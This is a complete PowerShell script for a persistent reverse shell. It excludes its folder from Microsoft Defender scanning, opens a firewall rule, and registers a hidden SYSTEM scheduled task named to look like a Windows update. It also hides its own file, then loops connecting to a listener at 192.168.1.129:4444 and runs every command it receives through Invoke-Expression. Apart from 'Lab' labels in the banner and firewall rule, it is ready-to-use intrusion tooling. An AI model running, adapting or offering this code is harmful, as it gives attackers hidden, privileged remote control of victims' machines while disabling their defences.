# --- CONFIGURATION ---
$LHOST = "192.168.1.129" # Your listener IP
$LPORT = 4444          # Your listener Port
$WorkDir = "C:\Windows\Temp"
$ScriptName = "service.ps1"
$FullPath = Join-Path $WorkDir $ScriptName
$TaskName = "WinUpdateMaintenance"
# ---------------------

# 1. SETUP & PERSISTENCE (Runs only once or on update)
if (-not (Test-Path $WorkDir)) {
    New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
}

# Add self-exclusion to Microsoft Defender
try {
    Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue
} catch {}

# Add Outbound Firewall Rule for the listener port
try {
    if (-not (Get-NetFirewallRule -DisplayName "Lab Management Outbound" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
    }
} catch {}

# Register Scheduled Task Persistence (runs as SYSTEM at startup)
try {
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $FullPath"
        $Trigger = New-ScheduledTaskTrigger -AtStartup
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
    }
} catch {}

# Hide the file
if (Test-Path $FullPath) {
    attrib +h +s $FullPath
}

# 2. THE ENGINE (The Reverse Shell)
while ($true) {
    try {
        # Attempt connection
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        # Initial banner to confirm execution
        $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
        $writer.WriteLine("--- Running as: $(whoami) ---")
        $writer.WriteLine("--- Persistence and Firewall Rules Active ---")
        
        while ($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            
            # Read line from the stream
            $command = $reader.ReadLine()
            
            # Handle empty input or exit command
            if ($null -eq $command) { break }
            $command = $command.Trim()
            if ($command -eq "exit") { break }
            if ($command -eq "") { continue }

            $output = try {
                Invoke-Expression $command 2>&1 | Out-String
            } catch {
                "Error: " + $_.Exception.Message
            }

            # Ensure we send something back so the listener doesn't hang
            if ([string]::IsNullOrWhiteSpace($output)) { $output = "`n" }
            $writer.Write($output)
        }
    } catch {
        # Listener not found or connection lost? Wait 10 seconds and retry.
        Start-Sleep -Seconds 10
    } finally {
        # Clean up objects safely
        if ($null -ne $client) { $client.Close() }
        if ($null -ne $reader) { $reader.Close() }
        if ($null -ne $writer) { $writer.Close() }
    }
}
